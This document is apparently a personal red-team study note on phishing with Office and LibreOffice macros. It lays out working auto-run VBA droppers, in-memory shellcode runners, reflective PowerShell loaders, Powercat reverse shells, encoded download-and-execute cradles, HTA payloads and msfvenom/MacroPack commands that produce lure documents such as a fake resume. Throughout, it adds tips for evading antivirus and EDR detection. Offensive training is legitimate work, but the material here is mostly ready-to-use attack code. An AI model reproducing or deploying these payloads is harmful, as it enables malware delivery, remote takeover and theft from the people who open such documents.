---
title: Phishing with Microsoft Office
draft: false
tags:
  - red-teaming
  - phishing
  - vba
  - office
  - windows
  - client-side
---
 
Navigate to View -> Macros -> Select a name for the macro and the current document in the drop down menu

Programming Languaje developed my Microsoft for automating tasks and extending the functionality of Office apps. It can be used to automate processes, interact with Windows API, implement user-defined functions.

Word and Excel allows users to embed VBA macros (programs) in documents/spreadsheets for the automation of manual and repetitive tasks.

Wscript: Windows Script Host object model that provides a scripting environment for executing scripts on Windows-based OS. It can be utilized to extend the capabilities of VBA macros by enabling them to interact with the Windows OS, execute external commands, manipulate files and folders. Its like calling a library or class.

> [!Note]
> Macro document open extensions:
> - Valid extensions: `.doc`, `.docm`, `.dot` and `.dotm`.
> - Invalid extensions: `.docx`.

> [!Important]
> Save the Documents with Macros as **Word Macro-Enabled Document** (.docm) or **Word 97-2003 Document** (.doc -> best option)

# Basic Macros

- Hello World:
```vb
Sub HelloWorld()
'
' HelloWorld Macro
'
'

    MsgBox "Hello World!", vbInformation, "Message Box Demo"

End Sub
```

---

- Execute external program:
```vb
Sub PoC()
    Dim payload As String
    payload = "cmd.exe"
    CreateObject("Wscript.shell").Run payload, 0, False 
    ' Create a Wscript object to Invoke shell and execute the payload
End Sub

Parameters:
payload: external program (type string)
windowstyle: type of window (minimized, hidden, maximized, etc)
wait: wait for completion?
```

> [!Note]
> **Windowstyle**
> - 0 -> hides the window and activates another window (run the process in background). We can also put `vbHide`.
> - 1 -> activates and displays the window and the window is minimized or maximized the system restores it to its original position
> - 2 -> activates the window and displays it as minimized window
> - 3 -> activates the window and displays it as maximized window

- Execute program + execute macro when document is opened:
```vb
Sub Document_Open() 'Use Workbook_Open if its an excel file
    PoC ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    PoC ' this subroutine is triggered when the document is opened
End Sub

Sub PoC()
    Dim wsh As Object ' create variable "wsh" that is type Object
    Set wsh = CreateObject("Wscript.shell") ' Set the variable to the function CreateObject
    wsh.Run "notepad.exe", 2, False ' Create a Wscript object to Invoke shell and execute the payload, windowstyle
End Sub
```

> [!Note]
> Both procedures (`Document_Open` and `AutoOpen`) differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.
> VBA implementations may vary across the various Office applications. For example, `Document_Open()` is called `Workbook_Open()` in Excel.

- Read the registry:
```vb
Sub Document_Open()
    RegRead ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    RegRead ' this subroutine is triggered when the document is opened
End Sub

Sub RegRead()
    Dim wsh As Object
    Set wsh = CreateObject("Wscript.shell")
    
    Dim regKey As String
    regKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    MsgBox "Product Name: " & wsh.RegRead(regKey & "\ProductName")
End Sub
    
```

---
# VBA Powershell Dropper

Dropper: malicious code or payload that dont gain initial access but downloads external payloads that will be used to gain the initial access.

We will create a Word document that downloads a payload with powershell and later executes it:

1. Create the payload:
```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe > shell.exe
```

2. Host the payload on a web server
```sh
$ sudo python3 -m http.server LOCAL_PORT
```

3. Setup a listener:
```bash
msf> use multi/handler
msf> set LPORT LPORT
msf> set LHOST LHOST
msf> set payload windows/meterpreter/reverse_tcp
msf> run
```

4. Create the word document with a macro that downloads the payload and executes it:
```vb
Sub Document_Open()
    dropper ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    dropper ' this subroutine is triggered when the document is opened
End Sub

Sub dropper()
    Dim url As String ' variable that stores remote web server address
    Dim psScript As String ' variable that stores PowerShell script/command to execute
    
    url = "http://LOCAL_HOST:LOCAL_PORT/shell.exe" ' URL of the remote web server hosting the payload for initial access

	' PowerShell script to download and execute the file
    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Temp\file.exe"";" & vbCrLf & _
    "Start-Process -FilePath ""C:\Temp\file.exe"""

	' Execute the PowerShell script using Shell and hides the window for extra stealth'
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vbHide"
End Sub
```

> [!Note]
> - `vbCrLf` is used to represent `\n`
> - Triple " are used to include a single " in the string
> - Setup a multihandler on LHOST and LPORT of the payload and open de document

- **Alternative**: use different powershell .Net Net.WebClient Class and wait for download:
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://LOCAL_IP/shell.exe', 'shell.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now ' get current date
    Do
        DoEvents ' allow Word to process other actions while we wait and dont block it
    Loop Until Now >= DateAdd("s", n, t) ' while loop until current date is greater than loop init date + wait seconds
End Sub
```

> [!Note]
> 1. `ActiveDocument.Path` returns the current folder of the Word document where downloaded files are placed.
> 2. We created a `Wait` function to make sure that the payload is downloaded before executing it.

The problem is that the downloaded executable may be flagged by network monitoring software or host-based network monitoring. In addition, we are storing the executable on the hard drive, which may trigger local antivirus software.

> [!Warning] OPSEC
> - Dropping an `.exe` to disk (`C:\Temp\`) is highly detectable — EDR solutions flag both the write event and the subsequent process creation.
> - The `Invoke-WebRequest` / `DownloadFile` calls generate network telemetry visible to network monitoring tools and proxies.
> - Prefer the in-memory shellcode runner (below) to avoid touching disk entirely.
> - Use HTTPS (not HTTP) for payload delivery to avoid cleartext network inspection.
> - Consider using `C:\Users\Public\` instead of `C:\Temp\` — `C:\Temp\` doesn't always exist and creating it may itself be logged.

---
# Executing Shellcode in Word memory (partially detectable)

**VBA Shellcode Runner (partially evade detection)**

This technique imports Win32 API functions from DLLs and runs them as unmanaged code. We require to translate the C argument types to VBA (we can use MSDN) for function declarations.

> [!Requirements]
> Identify the target architecture to generate the shellcode correctly and know the buffer size.

1. Generate the shellcode:
```sh
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=443 EXITFUNC=thread -f vbapplication

Parameters:
-f: format as vba application
EXITFUNC: we set it to THREAD instead of default value "process" since its executed inside WORD and we dont want to close it when the shellcode exits
```

2. Generate the VBA Macro:
```vb
' Import Win32 APIs from VBA:
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72,
    ...
    06,0,89,187,224,29,42,10,65,137,218,255,213) ' Here we place the generated shellcode
	
	' Allocate memory with VirtualAlloc for our shellcode:
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 
    ' lpAddress = 0 -> leave the memory allocation to the API
    ' dwSize = dynamic size of the buffer (shellcode)
    ' MEM_COMMIT and MEM_RESERVE = &H3000 (0x3000) -> make the operating system allocate the desired memory for us and make it available
    ' &H40 (0x40) -> indicate that the memory is readable, writable, and executable
    
    ' Copy byte-by-byte the shellcode into the memory location with RtlMoveMemory
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' Create a execution thread in a process to execute our shellcode:
    res = CreateThread(0, 0, addr, 0, 0, 0)
    ' lpStartAddress = addr -> start address for code execution (addr of our shellcode buffer in memory)
    ' lpParameter = 0 -> pointer to args for the code residing at the starting address (no args = 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

> [!Note]
> The parent process of the Shellcode is Word because we are creating a Thread of the main process.

3. Setup a listener:
```sh
msf> use multi/handler
msf> set LHOST 
msf> set LPORT LPORT
msf> set payload windows/x64/meterpreter/reverse_https
msf> set EXITFUNC thread
```

The primary disadvantage is that when the victim closes Word, our shell will die. Metasploit's _AutoMigrate_ module could solve this — it migrates the Meterpreter session to another process (e.g. `explorer.exe`) automatically after the shell is established.

```sh
# Auto-migrate on session open (set before running the handler):
msf> set AutoRunScript post/windows/manage/migrate
```

> [!Warning] OPSEC
> - `VirtualAlloc` with `RWX` (`0x40`) permissions is a well-known shellcode injection pattern — many EDRs flag this memory allocation signature.
> - Consider allocating with `PAGE_READWRITE` (`0x04`) first, then calling `VirtualProtect` to switch to `PAGE_EXECUTE_READ` just before `CreateThread`.
> - `EXITFUNC=thread` is important: using `EXITFUNC=process` would kill the Word process when the shell exits.
> - Use `reverse_https` (port 443) over `reverse_tcp` for better firewall evasion.
> - See [[AV Evasion]] for macro obfuscation to reduce VBA detection.

**PowerShell Shellcode Runner (evade detection partially)**

Powershell cannot interact natively with Win32 APIs. But we can use .NET framework to run embedded C# code which can import Win32 API functions by calling unmanage DLL functions.

We must translate the C data types from the Win32 API function parameters to C# data types. We can use **P/Invoke**.

> [!Important]
> When we run PowerShell code with `Add-Type`, the Visual C# Command-Line Compiler handles the compilation process and writes both the C# source code and the compiled C# assembly temporarily to disk. **This leaves artifacts on the hard drive that antivirus programs can identify**.

1. Generate payload shellcode:
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LOCAL_IP LPORT=LOCAL_PORT EXITFUNC=thread -f ps1
```

2. Generate the malicious ps1 script:
```powershell
# Import Win32 APIs from powershell via P/Invoke:
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32 # compile and create an object containing the structures, values, functions, or code inside to be able to call the functions

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0... # here we place our generated shellcode

$size = $buf.Length # get the payload size

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40); # allocate space in memory for the payload

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size) # copy the payload into the allocated memory

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0); # execute the payload

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF") # pause the script and allow Meterpreter to execute (wait until we close the shell)
```

3. Create the Word Macro that creates a cradle that downloads the payload into memory and executes it directly via IEX:
```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

> [!Note]
> We can use a different extension for the `.ps1` script like `.txt` and it will work.

---
# Executing Shellcode completely in Word memory (undetectable)

**1. Reflective PowerShell Shellcode Runner**

1. Create the Work Macro:
```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.50.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

2. Create the `ps1` script with the reflective PowerShell content from [[Reflective PowerShell]] section:
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

3. Start a web server to host the `ps1` script:
```sh
$ python3 -m http.server 80
```

4. Start a listener:
```sh
msf> use multi/handler
msf> set LHOST 
msf> set LPORT LPORT
msf> set payload windows/x64/meterpreter/reverse_https
msf> set EXITFUNC thread
msf> run
```

**2. Reflective C# Shellcode Runner (review the video)**

1. Add a new `Class Library (.Net Framework)` Project to the existing Solution:
![[Pasted image 20260704130318.png]]

2. Create a Class and import the necessary DLLs. Also create a runner method that must be available through reflection (public and static):
```csharp
public class Class1
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
     uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void runner()
    {
    }
} 
```

3. Copy the exact content of the _Main_ method of the _ConsoleApp1_ project into the _runner_ method (We'll also need to replace the namespace imports to match those of the _ConsoleApp1_ project)

4. Compile the code in Visual Studio and generate the DLL.

5. Start a web server to host the `ps1` script:
```sh
$ python3 -m http.server 80
```

6. Start a listener:
```sh
msf> use multi/handler
msf> set LHOST 
msf> set LPORT LPORT
msf> set payload windows/x64/meterpreter/reverse_https
msf> set EXITFUNC thread
msf> run
```

7. Use a download cradle to download the newly created DLL as a byte array and we can interact with the DLL using reflection:
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.120/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

---
# VBA reverse shell macro with Powercat
Powercat: powershell version of netcat
Repo: https://github.com/secabstraction/PowerCat

1. Host powercat:
```sh
$ python3 -m http.server LOCAL_PORT
```

3. Setup a listener:
```sh
$ nc -nlvp LOCAL_PORT
```

4. Create the VBA macro that reaches the powerchat
```vb
Sub Document_Open()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub powercat()
    Dim url As String ' variable that stores remote web server address
    Dim psScript As String ' variable that stores PowerShell script/command to execute
    
    url = "http://LOCAL_HOST:LOCAL_PORT/powercat.ps1" ' URL of the remote web server hosting the payload for initial access

	' PowerShell script to download and execute the file
    psScript = "IEX(New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c LOCAL_HOST -p LOCAL_PORT -e cmd"

	' Execute the PowerShell script using Shell and hides the window for extra stealth'
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vbHide"
End Sub
```

**Encoded reverse shell**
1. Generate encoded reverse shell on attack machine:
```sh
LHOST=LOCAL_HOST
LPORT=LOCAL_PORT
pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('POWERCAT_PS1_URL'); powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/reverse-shell.exe
```

2. Host the reverse shell:
```sh
$ cd /tmp
$ python3 -m http.server LOCAL_PORT
```

3. Create the macro:
```vb
Sub Document_Open()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub powercat()
    Dim Str As String
    Str = "powershell -c ""$code=(New-Object System.Net.WebClient).DownloadString('http://LOCAL_HOST:LOCAL_PORT/reverse_shell.txt');IEX 'powershell -E $code'"""
    CreateObject("Wscript.Shell").Run str
```

Here the only difference is that the reverse shell is encoded with powershell encode so powershell knows how to decode it (this will be done in memory) and executed

---
# Encoded Reverse shell (payload)
This option is recommended to guarantee that the command will be executed correctly and wont fail due to a special character.

1. Encode the payload:
```bash
$ echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell" | base64

SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw
Oi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4y
IC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo=
```

2. Split the base64 encoded string into pieces of 50 characters:
```python
str = "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40OS42Mi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ5LjYyIC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo="

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

> [!Note]
> Make sure that in the base64 string payload we dont introduce any new lines.

3. Execute the script:
```bash
$ vim script.py
$ chmod +x script.py 
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
Str = Str + "WUgcG93ZXJzaGVsbAo="
```

4. Create the macro:
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
	Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
	Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
	Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
	Str = Str + "WUgcG93ZXJzaGVsbAo="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

---
# Weaponizing VBA Macros With MSF
Native `vba` msfvenom format is problematic with future versions of Microsoft Office. Use `vba-psh` or `vba-cmd` better.

```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f vba-exe
```
Check output steps:

1. Copy the Macro into the office document macro editor
2. The hex dump must be appended to the end of the document contents (litteraly paste it on the document -> try to masquerade it somehow obviously)
3. Set up a multi/handler and open the document

```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f vba-psh
```

1. Copy the Macro into the office document macro editor
2. Set up a multi/handler and open the document

- Encoded payload:
```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f vba-psh
```

## Using activeX controls for Macro Execution
ActiveX: technologies developed my Microsoft for creating interactive content within web pages and desktop applications.

It provides a framework for developing reusable software components, known as ActiveX Controls, which can be embedded in web pages, documents... In the case of Office documents, it allows the execution of Macros.

By using ActiveX Controls, we can execute the macros automatically when the document is opened. This is useful to avoid AV detecion of AutoOpen and Document_Open macros

Word -> Developer -> Controls -> Legacy Controls -> More Controls -> Microsoft InkEdit Control
-> View Code

Replace InkEdit1_Change with InkEdit1_GotFocus for automatic execution of the VBA macro:
```vb
Sub InkEdit1_GotFocus()
    ' VBA macro code here
End Sub
```

## HTML Applications (HTA)
Apps created using HTML, CSS and JS that run in a special environment using IE.
HTA files have the .hta extension
HTA apps allows the arbitrary execution of programs/code with IE or using mshta.exe (used by IE)

HTA files are executed by mshta.exe, which is the HTML application host. This executable allows HTAs to have more priviledged access to the system than standard web pages. 

HTAs have access to the local filesystem, registry and can execute **ActiveX controls**.

mshta.exe is the HTML Application Host, which is used to execute HTML applications. 

POC:
1. Go to /var/www/html and create a `poc.hta`:
```html
<html>
	<head>
		<script>
			var payload = "calc.exe"
			new ActiveXObject('Wscript.Shell').Run(payload);
		<script>
	</head>
	<body>
		<h1> HTA POC </h1>
		<script>
			self.close(); // to avoid the window with the html to open
		</script>
	</body>
</html>
```

2. Start the web server:
```sh
sudo systemctl start apache2
```

3. Navigate to `LOCAL_IP/poc.hta` and accept all:

The HTA file will be executed with mshta.exe outside of the browser sandbox so we will get the privileges of the current user. 

## HTA Attacks

1. Go to the apache dir:
```sh
$ cd /var/www/html/
```

2. Create a payload:
```sh
$ msfvenom LHOST=LOCAL_IP LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f hta-psh -o shell.hta
```

3. Setup a listener:
```
nc -nlvp LOCAL_PORT
```

4. Navigate to `http://LOCAL_HOST/shell.hta` and open the file

Another option is to create a Word document with a macro that executes the HTA application (follow above steps to host the HTA file):
```vb
Sub Document_Open()
    ExecuteHTA ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    ExecuteHTA ' this subroutine is triggered when the document is opened
End Sub

Sub ExecuteHTA()
    Dim url As String ' variable that stores remote web server address
    Dim command As String ' variable that stores PowerShell script/command to execute
    
    url = "http://LOCAL_HOST/shell.hta" ' URL of the remote web server hosting the payload for initial access

	' PowerShell script to execute the HTA app
    command = "mshta.exe " & url

	' Execute the PowerShell script using Shell and hides the window for extra stealth'
    Shell command, vbNormalFocus
End Sub
```

## Automating Macro development with MacroPack

Help
```powershell
PSH> .\macro_pack.exe --help
```

List formats:
```powershell
PSH> .\macro_pack.exe --listformats
```

Arbitrary Command Execution:
```powershell
PSH> echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc"
Parameters: 
-t: specifies the type of payload/template being used, in this case the template type is **CMD**.
-o: This enables VBA code obfuscation.
-G: This specifies the name and type of the output file, in this case the output file is "test.doc".
"calc.exe": it can be a command ("cat") or an executable and is going to be executed by the payload type
```

List templates (payload type: dropper, cmd, ...):
```powershell
PSH> .\macro_pack.exe --listtemplates
```

Generate meterpreter reverse shell payload and inject it:
```powershell
PSH> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT | .\macro_pack.exe -o -G "resume.doc"

PSH> msfconsole.bat
msf> use multi/handler
msf> set options..
msf > run

PSH> python -m http.server 8080

*Go to the target machine and download and run the document*
```

Dropper:
```powershell
1. Create the payload we are going to host
PSH> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f exe -o update.exe

2. Create the malicious document that will download and execute the payload we are hosting
PSH> echo "http://LOCAL_HOST:HTTP_LOCAL_PORT/update.exe" "update.exe" | .\macro_pack.exe -t DROPPER -o -G "Accounts2025.xls"

3. Setup a listener for the payload when executed
PSH> msfconsole.bat
msf> use multi/handler
msf> set options..
msf > run

4. Setup a server for downloading the payload
PSH> python -m http.server HTTP_LOCAL_PORT

*Go to the target machine and download and run the document*
```

## Macro reverse shell

1. Open libreoffice:
```bash
$ libreoffice
```

2. Create the macro: Go to Tools -> Macros -> Organize Macros -> Basic -> New (create a new one over the document we are using)
```vb
Sub Main
	Shell("cmd /c certutil -urlcache -split -f http://192.168.45.215/shell.exe C:\Windows\Temp\shell.exe")
	Shell("cmd /c C:\Windows\Temp\shell.exe")
End Sub
```

3. Insert the macro in the document: Go to Tools -> Customize -> Events -> Open Document and select the macro you created (`Main`). This binds the macro to the `Open Document` event so it executes automatically when the file is opened.

> [!Note]
> LibreOffice macros work cross-platform (Linux/macOS/Windows). The `Shell()` call syntax in LibreOffice Basic differs slightly from VBA — it takes a single string command directly rather than using `CreateObject("Wscript.Shell")`.

> [!Warning]
> LibreOffice will prompt the user to enable macros by default unless the document is opened from a trusted location or macro security is lowered. For red team engagements, social engineering (see [[Pretexting]]) is required to convince the victim to click "Enable Macros".

---
# Related Notes
- [[Client-Side Attacks]] — overview of client-side attack vectors
- [[Pretexting]] — social engineering templates para convencer a la víctima de abrir el documento
- [[Phishing with Calendars]] — phishing via calendar invites como vector alternativo
- [[AV Evasion]] — técnicas para ofuscar macros y evadir detección
- [[Command and Control (C2-C&C)]] — post-exploitation una vez obtenida la shell
